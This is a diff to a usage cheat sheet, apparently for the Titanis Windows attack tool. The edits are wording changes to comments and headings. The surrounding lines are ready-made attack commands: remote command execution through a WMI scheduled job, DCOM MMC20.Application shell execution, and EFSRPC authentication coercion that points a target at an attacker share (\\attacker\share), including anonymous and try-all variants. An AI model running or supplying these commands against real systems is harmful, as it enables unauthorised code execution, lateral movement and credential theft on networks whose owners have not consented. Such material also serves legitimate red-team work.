@@ -620,13 +620,13 @@ Wmi invoke $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP "Win32_Pro
 ### Scheduled-task via WMI
 
 ```powershell
-# Create a one-shot scheduled job. Note that it is an older API so may have issues
+# Create a scheduled job. Note that it is an older API so may have issues
 Wmi invoke $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP Win32_ScheduledJob Create "Command='cmd /c whoami> C:\\Windows\\Temp\\out.txt',StartTime='********143000.000000+000'"
 ```
 
 ## `Dcom`
 
-> Titanis resolves ProgIDs against the **attacker's** registry, not the target's. On Linux there's no registry to resolve. Always pass the raw CLSID GUID.
+> Titanis resolves ProgIDs against the attacker's registry, not the target's. On Linux there's no registry to resolve and so Always pass the raw CLSID GUID.
 
 ```powershell
 # MMC20.Application, Document.ActiveView.ExecuteShellCommand (4 args: cmd, dir, params, windowstate)
@@ -643,13 +643,13 @@ Reg list $TARGET "HKLM\SOFTWARE\Classes\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F
 ```
 
 
-## `CredCoerce` Utility to preform EFSRPC Coercion
+## `CredCoerce`
 
 ```powershell
 # Force the target to authenticate to your listener via EFSRPC
 CredCoerce $TARGET "\\attacker\share\file.txt" -Techniques Efs.OpenFile -u $UPN -p $PASS -Kdc $DC_IP
 
-# Try ALL implemented techniques
+# Try all presently implemented techniques
 CredCoerce $TARGET "\\attacker\share\file.txt" -Techniques "*" -u $UPN -p $PASS -Kdc $DC_IP
 
 # Anonymous (sometimes works on legacy / unpatched targets)
